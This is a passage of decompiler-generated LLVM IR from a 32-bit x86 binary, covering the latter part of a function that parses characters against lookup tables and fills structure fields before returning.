  %v0_804af42 = phi i32 [ %v1_804ad91, %dec_label_pc_804ad91 ], [ %v0_804af1f.pre.pre, %dec_label_pc_804af29 ]
  %v0_804af3f = phi i32 [ %v0_804af29, %dec_label_pc_804ad91 ], [ %v1_804af29, %dec_label_pc_804af29 ]
  %v1_804af31 = add i32 %v0_804af3f, -134551000
  %v1_804af36 = add i32 %v0_804af3f, -134551001
  %v5_804af36 = sub i32 134551000, %v0_804af3f
  %v6_804af36 = and i32 %v1_804af31, %v5_804af36
  %v7_804af36 = icmp slt i32 %v6_804af36, 0
  %v8_804af36 = icmp eq i32 %v1_804af36, 0
  %v9_804af36 = icmp slt i32 %v1_804af36, 0
  store i32 %v1_804af36, i32* %eax.global-to-local, align 4
  %v3_804af37 = icmp eq i1 %v9_804af36, %v7_804af36
  %v4_804af37 = icmp eq i1 %v8_804af36, false
  %v5_804af37 = and i1 %v4_804af37, %v3_804af37
  br i1 %v5_804af37, label %dec_label_pc_804af43, label %dec_label_pc_804af39

dec_label_pc_804af39:                             ; preds = %dec_label_pc_804af2f
  %v1_804af39 = inttoptr i32 %v0_804af42 to i8*
  %v2_804af39 = load i8, i8* %v1_804af39, align 1
  %v3_804af39 = zext i8 %v2_804af39 to i32
  %v5_804af39 = and i32 %v1_804af36, -256
  %v6_804af39 = or i32 %v3_804af39, %v5_804af39
  store i32 %v6_804af39, i32* %eax.global-to-local, align 4
  %v3_804af3b = inttoptr i32 %v0_804af3f to i8*
  %v4_804af3b = load i8, i8* %v3_804af3b, align 1
  %v15_804af3b = icmp eq i8 %v2_804af39, %v4_804af3b
  %v1_804af3d = icmp eq i1 %v15_804af3b, false
  br i1 %v1_804af3d, label %dec_label_pc_804af43, label %dec_label_pc_804af3f

dec_label_pc_804af3f:                             ; preds = %dec_label_pc_804af39
  %v1_804af3f = add i32 %v0_804af3f, 9
  store i32 %v1_804af3f, i32* @edx, align 4
  %v1_804af42 = add i32 %v0_804af42, 1
  store i32 %v1_804af42, i32* @esi, align 4
  br label %dec_label_pc_804af43

dec_label_pc_804af43:                             ; preds = %dec_label_pc_804af39, %dec_label_pc_804af2f, %dec_label_pc_804af3f
  %v4_804af4a = phi i32 [ %v6_804af39, %dec_label_pc_804af39 ], [ %v1_804af36, %dec_label_pc_804af2f ], [ %v6_804af39, %dec_label_pc_804af3f ]
  %v0_804af4a = phi i32 [ %v0_804af42, %dec_label_pc_804af39 ], [ %v0_804af42, %dec_label_pc_804af2f ], [ %v1_804af42, %dec_label_pc_804af3f ]
  %v0_804af43 = phi i32 [ %v0_804af3f, %dec_label_pc_804af39 ], [ %v0_804af3f, %dec_label_pc_804af2f ], [ %v1_804af3f, %dec_label_pc_804af3f ]
  %v1_804af43 = add i32 %v0_804af43, 9
  %v2_804af43 = inttoptr i32 %v1_804af43 to i8*
  %v3_804af43 = load i8, i8* %v2_804af43, align 1
  %v4_804af43 = sext i8 %v3_804af43 to i32
  %v2_804af47 = mul nsw i32 %v4_804af43, 256
  store i32 %v2_804af47, i32* %ebx.global-to-local, align 4
  %v1_804af4a = inttoptr i32 %v0_804af4a to i8*
  %v2_804af4a = load i8, i8* %v1_804af4a, align 1
  %v3_804af4a = zext i8 %v2_804af4a to i32
  %v5_804af4a = and i32 %v4_804af4a, -256
  %v6_804af4a = or i32 %v3_804af4a, %v5_804af4a
  store i32 %v6_804af4a, i32* %eax.global-to-local, align 4
  %v4_804af4c = icmp eq i8 %v2_804af4a, 0
  br i1 %v4_804af4c, label %dec_label_pc_804b100, label %dec_label_pc_804af54

dec_label_pc_804af54:                             ; preds = %dec_label_pc_804af43
  store i32 ptrtoint ([21 x i8]* @global_var_8051615.329 to i32), i32* %ecx.global-to-local, align 4
  %v3_804af59 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804af59, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804af5d

dec_label_pc_804af5d:                             ; preds = %dec_label_pc_804afac, %dec_label_pc_804af54
  %v0_804afac = phi i32 [ %v1_804afac, %dec_label_pc_804afac ], [ ptrtoint ([21 x i8]* @global_var_8051615.329 to i32), %dec_label_pc_804af54 ]
  %v3_804af5d = inttoptr i32 %v0_804afac to i8*
  %v4_804af5d = load i8, i8* %v3_804af5d, align 1
  %v15_804af5d = icmp eq i8 %v2_804af4a, %v4_804af5d
  %v1_804af5f = icmp eq i1 %v15_804af5d, false
  br i1 %v1_804af5f, label %dec_label_pc_804afac, label %dec_label_pc_804af61

dec_label_pc_804af61:                             ; preds = %dec_label_pc_804af5d
  %v1_804af63 = add i32 %v0_804afac, -134551061
  store i32 %v1_804af63, i32* %edx.global-to-local, align 4
  %v7_804af6c = icmp sgt i32 %v1_804af63, 17
  br i1 %v7_804af6c, label %dec_label_pc_804af6e, label %dec_label_pc_804af76

dec_label_pc_804af6e:                             ; preds = %dec_label_pc_804af61
  %v3_804af6e = and i32 %v2_804af47, 1024
  %v4_804af6e = icmp eq i32 %v3_804af6e, 0
  br i1 %v4_804af6e, label %dec_label_pc_804af76, label %dec_label_pc_804af73

dec_label_pc_804af73:                             ; preds = %dec_label_pc_804af6e
  %v1_804af73 = add i32 %v0_804afac, -134551063
  store i32 %v1_804af73, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804af76

dec_label_pc_804af76:                             ; preds = %dec_label_pc_804af61, %dec_label_pc_804af6e, %dec_label_pc_804af73
  %v0_804af7f = phi i32 [ %v1_804af63, %dec_label_pc_804af61 ], [ %v1_804af63, %dec_label_pc_804af6e ], [ %v1_804af73, %dec_label_pc_804af73 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805160b.330 to i32), i32* %ecx.global-to-local, align 4
  %v2_804af7f = add i32 %tmp76, 32
  %v3_804af7f = inttoptr i32 %v2_804af7f to i32*
  store i32 %v0_804af7f, i32* %v3_804af7f, align 4
  %v0_804af82.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804af86.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804af82

dec_label_pc_804af82:                             ; preds = %dec_label_pc_804af82, %dec_label_pc_804af76
  %v0_804af82 = phi i32 [ %v1_804af82, %dec_label_pc_804af82 ], [ %v0_804af82.pre, %dec_label_pc_804af76 ]
  %v1_804af82 = add i32 %v0_804af82, 1
  store i32 %v1_804af82, i32* %ecx.global-to-local, align 4
  %v1_804af83 = inttoptr i32 %v1_804af82 to i8*
  %v2_804af83 = load i8, i8* %v1_804af83, align 1
  %v3_804af83 = sext i8 %v2_804af83 to i32
  store i32 %v3_804af83, i32* %eax.global-to-local, align 4
  %v8_804af88 = icmp sgt i32 %v0_804af86.pre, %v3_804af83
  br i1 %v8_804af88, label %dec_label_pc_804af82, label %dec_label_pc_804af8a

dec_label_pc_804af8a:                             ; preds = %dec_label_pc_804af82
  store i32 ptrtoint ([21 x i8]* @global_var_8051615.329 to i32), i32* @ecx, align 4
  %v1_804af91 = add i32 %v0_804af82, -134551051
  store i32 %v1_804af91, i32* %eax.global-to-local, align 4
  %v2_804af96 = add i32 %v0_804af82, add (i32 ptrtoint (i32* @global_var_80515fc.331 to i32), i32 -134551051)
  %v3_804af96 = add i32 %v2_804af96, %v1_804af91
  %v4_804af96 = inttoptr i32 %v3_804af96 to i16*
  %v5_804af96 = load i16, i16* %v4_804af96, align 2
  %v6_804af96 = sext i16 %v5_804af96 to i32
  store i32 %v6_804af96, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804af91, 2
  %v3_804af9e = add i32 %factor, 134551020
  %v4_804af9e = inttoptr i32 %v3_804af9e to i16*
  %v5_804af9e = load i16, i16* %v4_804af9e, align 2
  %v6_804af9e = sext i16 %v5_804af9e to i32
  store i32 %v6_804af9e, i32* %eax.global-to-local, align 4
  %v1_804afa6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804afa6 = or i32 %v1_804afa6, %v6_804af96
  %v2_804afa8 = and i32 %v2_804afa6, %v6_804af9e
  store i32 %v2_804afa8, i32* %edx.global-to-local, align 4
  %v0_804afba.pre = load i32, i32* @esi, align 4
  %v0_804afbd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804afb2

dec_label_pc_804afac:                             ; preds = %dec_label_pc_804af5d
  %v1_804afac = add i32 %v0_804afac, 1
  store i32 %v1_804afac, i32* @ecx, align 4
  %v1_804afad = inttoptr i32 %v1_804afac to i8*
  %v2_804afad = load i8, i8* %v1_804afad, align 1
  %v3_804afad = icmp eq i8 %v2_804afad, 0
  %v1_804afb0 = icmp eq i1 %v3_804afad, false
  br i1 %v1_804afb0, label %dec_label_pc_804af5d, label %dec_label_pc_804afb2

dec_label_pc_804afb2:                             ; preds = %dec_label_pc_804afac, %dec_label_pc_804af8a
  %v0_804afbd = phi i32 [ %v0_804afbd.pre, %dec_label_pc_804af8a ], [ %storemerge4, %dec_label_pc_804afac ]
  %v0_804afba = phi i32 [ %v0_804afba.pre, %dec_label_pc_804af8a ], [ %v0_804af4a, %dec_label_pc_804afac ]
  %v0_804afb2 = phi i32 [ %v2_804afa8, %dec_label_pc_804af8a ], [ %v3_804af59, %dec_label_pc_804afac ]
  store i32 %v0_804afb2, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804afba = inttoptr i32 %v0_804afba to i8*
  %v2_804afba = load i8, i8* %v1_804afba, align 1
  %v3_804afba = sext i8 %v2_804afba to i32
  store i32 %v3_804afba, i32* %eax.global-to-local, align 4
  %v2_804afbd = add i32 %tmp76, 4
  %v3_804afbd = inttoptr i32 %v2_804afbd to i32*
  store i32 %v0_804afbd, i32* %v3_804afbd, align 4
  %v0_804afc0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804afc0 = load i32, i32* @edx, align 4
  %v2_804afc0 = add i32 %v1_804afc0, 12
  %v3_804afc0 = inttoptr i32 %v2_804afc0 to i32*
  store i32 %v0_804afc0, i32* %v3_804afc0, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804afc7 = load i32, i32* @edx, align 4
  %v1_804afc7 = add i32 %v0_804afc7, 28
  %v2_804afc7 = inttoptr i32 %v1_804afc7 to i32*
  store i32 1, i32* %v2_804afc7, align 4
  %v0_804afce = load i32, i32* %eax.global-to-local, align 4
  %v1_804afce = load i32, i32* @edx, align 4
  %v2_804afce = add i32 %v1_804afce, 8
  %v3_804afce = inttoptr i32 %v2_804afce to i32*
  store i32 %v0_804afce, i32* %v3_804afce, align 4
  %v0_804afd1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804afdb = and i32 %v0_804afd1, -5
  %v0_804afe1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804afe1 = and i32 %v0_804afe1, 3840
  store i32 %v1_804afe1, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804afea = or i32 %v1_804afe1, %v1_804afdb
  store i32 %v2_804afea, i32* @edi, align 4
  %v1_804afec = load i32, i32* @edx, align 4
  %v2_804afec = add i32 %v1_804afec, 20
  %v3_804afec = inttoptr i32 %v2_804afec to i32*
  store i32 48, i32* %v3_804afec, align 4
  %v0_804afef = load i32, i32* @edi, align 4
  %v1_804afef = load i32, i32* @edx, align 4
  %v2_804afef = add i32 %v1_804afef, 16
  %v3_804afef = inttoptr i32 %v2_804afef to i32*
  store i32 %v0_804afef, i32* %v3_804afef, align 4
  %v0_804aff2 = load i32, i32* @ecx, align 4
  %v1_804aff2 = inttoptr i32 %v0_804aff2 to i8*
  %v2_804aff2 = load i8, i8* %v1_804aff2, align 1
  %v3_804aff2 = icmp eq i8 %v2_804aff2, 0
  %v1_804aff5 = icmp eq i1 %v3_804aff2, false
  br i1 %v1_804aff5, label %dec_label_pc_804b00e, label %dec_label_pc_804aff7

dec_label_pc_804aff7:                             ; preds = %dec_label_pc_804afb2
  %v0_804aff7 = load i32, i32* @esi, align 4
  %v1_804aff7 = inttoptr i32 %v0_804aff7 to i8*
  %v2_804aff7 = load i8, i8* %v1_804aff7, align 1
  %v11_804aff7 = icmp eq i8 %v2_804aff7, 109
  %v1_804affa = icmp eq i1 %v11_804aff7, false
  br i1 %v1_804affa, label %dec_label_pc_804b100, label %dec_label_pc_804b000

dec_label_pc_804b000:                             ; preds = %dec_label_pc_804aff7
  %v0_804b000 = load i32, i32* @edx, align 4
  %v1_804b000 = add i32 %v0_804b000, 32
  %v2_804b000 = inttoptr i32 %v1_804b000 to i32*
  store i32 20, i32* %v2_804b000, align 4
  %v0_804b007 = load i32, i32* @edx, align 4
  %v1_804b007 = add i32 %v0_804b007, 28
  %v2_804b007 = inttoptr i32 %v1_804b007 to i32*
  store i32 0, i32* %v2_804b007, align 4
  br label %dec_label_pc_804b00e

dec_label_pc_804b00e:                             ; preds = %dec_label_pc_804afb2, %dec_label_pc_804b000
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804b0a2, label %dec_label_pc_804b019

dec_label_pc_804b019:                             ; preds = %dec_label_pc_804b00e
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804b05a = add i32 %tmp76, 40
  %v1_804b093 = add i32 %tmp76, 28
  %v2_804b093 = inttoptr i32 %v1_804b093 to i32*
  %v4_804b028 = add i32 %tmp76, 36
  br label %dec_label_pc_804b01b

dec_label_pc_804b01b:                             ; preds = %dec_label_pc_804b08e, %dec_label_pc_804b019
  %v0_804b031 = phi i32 [ 0, %dec_label_pc_804b019 ], [ %v1_804b092, %dec_label_pc_804b08e ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804b019 ], [ %stack_var_-88.5, %dec_label_pc_804b08e ]
  %v1_804b01b = add i32 %v0_804b031, -2
  %v6_804b01b = sub i32 1, %v0_804b031
  %v7_804b01b = and i32 %v6_804b01b, %v0_804b031
  %v8_804b01b = icmp slt i32 %v7_804b01b, 0
  %v9_804b01b = icmp eq i32 %v1_804b01b, 0
  %v10_804b01b = icmp slt i32 %v1_804b01b, 0
  %v3_804b01e = icmp eq i1 %v10_804b01b, %v8_804b01b
  %v4_804b01e = icmp eq i1 %v9_804b01b, false
  %v5_804b01e = and i1 %v4_804b01e, %v3_804b01e
  br i1 %v5_804b01e, label %dec_label_pc_804b031, label %dec_label_pc_804b020

dec_label_pc_804b020:                             ; preds = %dec_label_pc_804b01b
  store i32 %tmp76, i32* @edx, align 4
  %v0_804b024 = load i32, i32* @esp, align 4
  %v2_804b024 = mul i32 %v0_804b031, 4
  %v3_804b024 = add i32 %v2_804b024, 68
  %v4_804b024 = add i32 %v3_804b024, %v0_804b024
  %v5_804b024 = inttoptr i32 %v4_804b024 to i32*
  %v6_804b024 = load i32, i32* %v5_804b024, align 4
  store i32 %v6_804b024, i32* %eax.global-to-local, align 4
  %v1_804b028 = trunc i32 %v6_804b024 to i8
  %v5_804b028 = add i32 %v4_804b028, %v0_804b031
  %v6_804b028 = inttoptr i32 %v5_804b028 to i8*
  store i8 %v1_804b028, i8* %v6_804b028, align 1
  %v0_804b02c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b02c = urem i32 %v0_804b02c, 256
  br label %dec_label_pc_804b03a

dec_label_pc_804b031:                             ; preds = %dec_label_pc_804b01b
  %v5_804b033 = add i32 %v0_804b031, %stack_var_-32.3
  store i32 %v5_804b033, i32* %eax.global-to-local, align 4
  %v1_804b037 = add i32 %v5_804b033, -2
  br label %dec_label_pc_804b03a

dec_label_pc_804b03a:                             ; preds = %dec_label_pc_804b020, %dec_label_pc_804b031
  %v0_804b04d = phi i32 [ %v1_804b02c, %dec_label_pc_804b020 ], [ %v1_804b037, %dec_label_pc_804b031 ]
  store i32 %v0_804b04d, i32* %eax.global-to-local, align 4
  %v5_804b03a = sub i32 %v0_804b04d, %stack_var_-88.4
  %v11_804b03a = xor i32 %v0_804b04d, %stack_var_-88.4
  %v12_804b03a = xor i32 %v5_804b03a, %v0_804b04d
  %v13_804b03a = and i32 %v12_804b03a, %v11_804b03a
  %v14_804b03a = icmp slt i32 %v13_804b03a, 0
  %v15_804b03a = icmp eq i32 %v5_804b03a, 0
  %v16_804b03a = icmp slt i32 %v5_804b03a, 0
  %v3_804b03e = icmp ne i1 %v16_804b03a, %v14_804b03a
  %v4_804b03e = or i1 %v15_804b03a, %v3_804b03e
  br i1 %v4_804b03e, label %dec_label_pc_804b04d, label %dec_label_pc_804b040

dec_label_pc_804b040:                             ; preds = %dec_label_pc_804b03a
  %v1_804b040 = add i32 %v0_804b04d, -9
  %v6_804b040 = sub i32 8, %v0_804b04d
  %v7_804b040 = and i32 %v6_804b040, %v0_804b04d
  %v8_804b040 = icmp slt i32 %v7_804b040, 0
  %v9_804b040 = icmp eq i32 %v1_804b040, 0
  %v10_804b040 = icmp slt i32 %v1_804b040, 0
  %v3_804b043 = icmp eq i1 %v10_804b040, %v8_804b040
  %v4_804b043 = icmp eq i1 %v9_804b040, false
  %v5_804b043 = and i1 %v4_804b043, %v3_804b043
  br i1 %v5_804b043, label %dec_label_pc_804b100, label %dec_label_pc_804b04d

dec_label_pc_804b04d:                             ; preds = %dec_label_pc_804b040, %dec_label_pc_804b03a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804b03a ], [ %v0_804b04d, %dec_label_pc_804b040 ]
  %v1_804b04d = add i32 %v0_804b04d, -1
  store i32 %v1_804b04d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804b056 = load i32, i32* @esp, align 4
  %v1_804b056 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b056 = mul i32 %v1_804b056, 4
  %v3_804b056 = add i32 %v0_804b056, 80
  %v4_804b056 = add i32 %v3_804b056, %v2_804b056
  %v5_804b056 = inttoptr i32 %v4_804b056 to i32*
  %v6_804b056 = load i32, i32* %v5_804b056, align 4
  store i32 %v6_804b056, i32* %edi.global-to-local, align 4
  %v2_804b05a = mul i32 %v1_804b04d, 4
  %v4_804b05a = add i32 %v3_804b05a, %v2_804b05a
  %v5_804b05a = inttoptr i32 %v4_804b05a to i32*
  %v6_804b05a = load i32, i32* %v5_804b05a, align 4
  store i32 %v6_804b05a, i32* @eax, align 4
  %v9_804b05e = icmp eq i32 %v6_804b056, 8
  br i1 %v9_804b05e, label %dec_label_pc_804b08e, label %dec_label_pc_804b063

dec_label_pc_804b063:                             ; preds = %dec_label_pc_804b04d
  %v9_804b063 = icmp eq i32 %v6_804b05a, 8
  br i1 %v9_804b063, label %dec_label_pc_804b07e, label %dec_label_pc_804b068

dec_label_pc_804b068:                             ; preds = %dec_label_pc_804b063
  %v12_804b068 = icmp eq i32 %v6_804b05a, %v6_804b056
  br i1 %v12_804b068, label %dec_label_pc_804b07e, label %dec_label_pc_804b06c

dec_label_pc_804b06c:                             ; preds = %dec_label_pc_804b068
  %v1_804b06c = call i32 @_promoted_size(i32 %v1_804b04d)
  store i32 %v1_804b06c, i32* %ebx.global-to-local, align 4
  %v0_804b073 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804b073, i32* @eax, align 4
  %v1_804b075 = call i32 @_promoted_size(i32 %v1_804b04d)
  store i32 %v1_804b075, i32* %eax.global-to-local, align 4
  %v8_804b07c = icmp sgt i32 %v1_804b06c, %v1_804b075
  br i1 %v8_804b07c, label %dec_label_pc_804b08e, label %dec_label_pc_804b06c.dec_label_pc_804b07e_crit_edge

dec_label_pc_804b06c.dec_label_pc_804b07e_crit_edge: ; preds = %dec_label_pc_804b06c
  %v0_804b086.pre = load i32, i32* @esp, align 4
  %v1_804b086.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804b07e

dec_label_pc_804b07e:                             ; preds = %dec_label_pc_804b06c.dec_label_pc_804b07e_crit_edge, %dec_label_pc_804b068, %dec_label_pc_804b063
  %v1_804b086 = phi i32 [ %v1_804b086.pre, %dec_label_pc_804b06c.dec_label_pc_804b07e_crit_edge ], [ %v1_804b056, %dec_label_pc_804b068 ], [ %v1_804b056, %dec_label_pc_804b063 ]
  %v0_804b086 = phi i32 [ %v0_804b086.pre, %dec_label_pc_804b06c.dec_label_pc_804b07e_crit_edge ], [ %v0_804b056, %dec_label_pc_804b068 ], [ %v0_804b056, %dec_label_pc_804b063 ]
  store i32 %v1_804b04d, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804b086 = mul i32 %v1_804b086, 4
  %v3_804b086 = add i32 %v0_804b086, 80
  %v4_804b086 = add i32 %v3_804b086, %v2_804b086
  %v5_804b086 = inttoptr i32 %v4_804b086 to i32*
  %v6_804b086 = load i32, i32* %v5_804b086, align 4
  store i32 %v6_804b086, i32* %eax.global-to-local, align 4
  store i32 %v6_804b086, i32* %v5_804b05a, align 4
  br label %dec_label_pc_804b08e

dec_label_pc_804b08e:                             ; preds = %dec_label_pc_804b06c, %dec_label_pc_804b04d, %dec_label_pc_804b07e
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804b092 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b092 = add i32 %v0_804b092, 1
  store i32 %v1_804b092, i32* %ebp.global-to-local, align 4
  %v3_804b093 = load i32, i32* %v2_804b093, align 4
  %v1_804b096 = add i32 %v3_804b093, 2
  store i32 %v1_804b096, i32* %eax.global-to-local, align 4
  %v5_804b09b = icmp slt i32 %v1_804b092, %v1_804b096
  br i1 %v5_804b09b, label %dec_label_pc_804b01b, label %dec_label_pc_804b0c9

dec_label_pc_804b0a2:                             ; preds = %dec_label_pc_804b00e
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804b0a6 = add i32 %tmp76, 38
  %v2_804b0a6 = inttoptr i32 %v1_804b0a6 to i8*
  store i8 1, i8* %v2_804b0a6, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804b0af = add i32 %tmp76, 28
  %v2_804b0af = inttoptr i32 %v1_804b0af to i32*
  %v3_804b0af = load i32, i32* %v2_804b0af, align 4
  %v2_804b0b2 = mul i32 %v3_804b0af, 4
  %v2_804b0b6 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b0bd = add i32 %tmp76, 40
  store i32 %v1_804b0bd, i32* %eax.global-to-local, align 4
  %v3_804b0c1 = inttoptr i32 %v1_804b0bd to i16*
  %v4_804b0c1 = call i32 @memcpy(i16* %v3_804b0c1, i32 %v2_804b0b6, i32 %v2_804b0b2)
  store i32 %v4_804b0c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b0c9

dec_label_pc_804b0c9:                             ; preds = %dec_label_pc_804b08e, %dec_label_pc_804b0a2
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804b0a2 ], [ %stack_var_-88.5, %dec_label_pc_804b08e ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804ad74, align 4
  %v0_804b0d4 = load i32, i32* @ecx, align 4
  %v1_804b0d4 = add i32 %v0_804b0d4, 16
  %v2_804b0d4 = inttoptr i32 %v1_804b0d4 to i8*
  %v3_804b0d4 = load i8, i8* %v2_804b0d4, align 1
  %v5_804b0d4 = icmp slt i8 %v3_804b0d4, 0
  br i1 %v5_804b0d4, label %dec_label_pc_804b0e1, label %dec_label_pc_804b0da

dec_label_pc_804b0da:                             ; preds = %dec_label_pc_804b0c9
  %v0_804b0da = load i32, i32* @esi, align 4
  %v1_804b0da = add i32 %v0_804b0da, 1
  store i32 %v1_804b0da, i32* %eax.global-to-local, align 4
  %v2_804b0dd = inttoptr i32 %v0_804b0d4 to i32*
  store i32 %v1_804b0da, i32* %v2_804b0dd, align 4
  br label %dec_label_pc_804b0f4

dec_label_pc_804b0e1:                             ; preds = %dec_label_pc_804b0c9
  store i32 %v4_804ad48, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804b0e9 = load i32, i32* @esi, align 4
  %v2_804b0e9 = sub i32 %v0_804b0e9, %v4_804ad48
  store i32 %v2_804b0e9, i32* %esi.global-to-local, align 4
  %v1_804b0eb = mul i32 %v2_804b0e9, 4
  %v2_804b0eb = add i32 %v1_804b0eb, 224
  store i32 %v2_804b0eb, i32* %eax.global-to-local, align 4
  %v2_804b0f2 = load i32, i32* %arg1, align 4
  %v4_804b0f2 = add i32 %v2_804b0f2, %v2_804b0eb
  store i32 %v4_804b0f2, i32* %arg1, align 4
  br label %dec_label_pc_804b0f4

dec_label_pc_804b0f4:                             ; preds = %dec_label_pc_804b0da, %dec_label_pc_804b0e1
  store i32 %tmp76, i32* @edx, align 4
  %v1_804b0f8 = add i32 %tmp76, 28
  %v2_804b0f8 = inttoptr i32 %v1_804b0f8 to i32*
  %v3_804b0f8 = load i32, i32* %v2_804b0f8, align 4
  store i32 %v3_804b0f8, i32* %eax.global-to-local, align 4
  %v1_804b0fb = add i32 %v3_804b0f8, 2
  br label %dec_label_pc_804b103

dec_label_pc_804b100:                             ; preds = %dec_label_pc_804ad99, %dec_label_pc_804ae33, %dec_label_pc_804ae66, %dec_label_pc_804aee1, %dec_label_pc_804aecd, %dec_label_pc_804aec4, %dec_label_pc_804b040, %dec_label_pc_804aff7, %dec_label_pc_804af43
  br label %dec_label_pc_804b103

dec_label_pc_804b103:                             ; preds = %dec_label_pc_804b0f4, %dec_label_pc_804b100
  %storemerge6 = phi i32 [ %v1_804b0fb, %dec_label_pc_804b0f4 ], [ -1, %dec_label_pc_804b100 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804b106 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b106, i32* @ebx, align 4
  store i32 %v0_804ad47, i32* @esi, align 4
  store i32 %v0_804ad46, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804b092, { 0, 2, 1 }
  uselistorder i32 %v1_804b04d, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804b040, { 1, 0 }
  uselistorder i32 %v5_804b03a, { 1, 2, 0 }
  uselistorder i32 %v0_804b04d, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804b01b, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804b031, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804afac, { 1, 2, 0 }
  uselistorder i32 %v1_804af82, { 1, 2, 0 }
  uselistorder i32 %v0_804afac, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804af47, { 1, 0 }
  uselistorder i32 %v1_804af36, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804af3f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804af29, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804af1f, { 1, 0 }
  uselistorder i32 %v1_804af01, { 1, 0 }
  uselistorder i32 %v0_804af1f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804aee4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804aedb, { 1, 2, 0 }
  uselistorder i32 %v0_804aea1, { 1, 0 }
  uselistorder i32 %v1_804ae93, { 1, 0 }
  uselistorder i32 %v1_804ae8e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804ae8c, { 2, 0, 1 }
  uselistorder i32 %v0_804aeae, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804ae49, { 1, 2, 0 }
  uselistorder i32 %v0_804ae21, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804ae14.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804ae0d.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804ae17, { 1, 2, 0 }
  uselistorder i32 %v6_804ae15, { 0, 2, 1 }
  uselistorder i32 %v1_804ae14, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804ae0d, { 2, 1, 0 }
  uselistorder i32 %v1_804ae05, { 1, 0 }
  uselistorder i32 %v1_804ae0d137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804adfd, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804adf0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804adeb, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804adc1, { 0, 2, 1 }
  uselistorder i32 %v2_804adb0, { 1, 0 }
  uselistorder i32 %v0_804adae, { 2, 0, 1 }
  uselistorder i32 %v4_804ad48, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 0, 42, 37, 38, 39, 40, 41, 43, 44 }
